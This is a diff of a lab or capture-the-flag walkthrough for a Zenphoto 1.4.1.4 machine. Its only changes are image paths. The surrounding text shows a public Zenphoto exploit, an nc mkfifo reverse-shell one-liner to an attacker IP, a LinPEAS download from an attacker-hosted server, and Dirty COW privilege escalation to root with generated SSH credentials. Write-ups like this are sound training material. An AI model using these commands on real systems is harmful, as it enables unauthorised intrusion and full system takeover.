@@ -44,23 +44,23 @@ Nmap done: 1 IP address (1 host up) scanned in 39.77 seconds
 ```
 
 Visiting web server on port 80.
-![](zenphoto1.png)
+![](Images/zenphoto1.png)
 Directory brute forcing.
-![](zenphoto2.png)
+![](Images/zenphoto2.png)
 
-![](zenphoto3.png)
+![](Images/zenphoto3.png)
 
 In page source, we found the version of zenphoto. (zenPHOTO 1.4.1.4)
-![](zenphoto4.png)
+![](Images/zenphoto4.png)
 Searched for public exploits
-![](zenphoto5.png)
+![](Images/zenphoto5.png)
 Run the exploit and checked its usage.
-![](zenphoto6.png)
+![](Images/zenphoto6.png)
 
 We run some basic commands and got to know that we are stuck in same directory.
-![](zenphoto7.png)
+![](Images/zenphoto7.png)
 We also know that we can run netcat. Let’s try getting another reverse shell using this command:
-![](zenphoto8.png)
+![](Images/zenphoto8.png)
 ```sh
 # nc mkfifo command from revshells.com  
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.245 4444 >/tmp/f  
@@ -68,13 +68,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.245 4444 >/tmp/
 # Set up listener on Kali Machine  
 nc -lvnp 4444
 ```
-![](zenphoto9.png)
+![](Images/zenphoto9.png)
 We got the shell and local flag.
-![](zenphoto10.png)
+![](Images/zenphoto10.png)
 ## Privilege Escalation
 
 Let’s see if we can upload LinPEAS. Check for curl and wget:
-![](zenphoto11.png)
+![](Images/zenphoto11.png)
 
 ```sh
 # set up a python HTTP server in Kali serving linpeas.sh  
@@ -86,24 +86,24 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 Highly probable exploits suggested by LinPEAS:
-![](zenphoto12.png)
+![](Images/zenphoto12.png)
 We downloaded the dirty cow 2 exploit from exploitdb and named it exploit.c.
 
 The script provided instructions on how to compile, run, and gain root privilege access.
 
 Download the exploit through exploit-db.
-![](zenphoto13.png)
+![](Images/zenphoto13.png)
 Renamed it.
-![](zenphoto14.png)
+![](Images/zenphoto14.png)
 Transfer it to the target server.
-![](zenphoto15.png)
+![](Images/zenphoto15.png)
 Follow the instructions provided in the script.
-![](zenphoto16.png)
-![](zenphoto17.png)
-![](zenphoto18.png)
+![](Images/zenphoto16.png)
+![](Images/zenphoto17.png)
+![](Images/zenphoto18.png)
 Login to ssh using creds we generated `firefart : 123`
 ```sh
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa firefart@192.168.169.41
 ```
 
-![](zenphoto19.png)
+![](Images/zenphoto19.png)
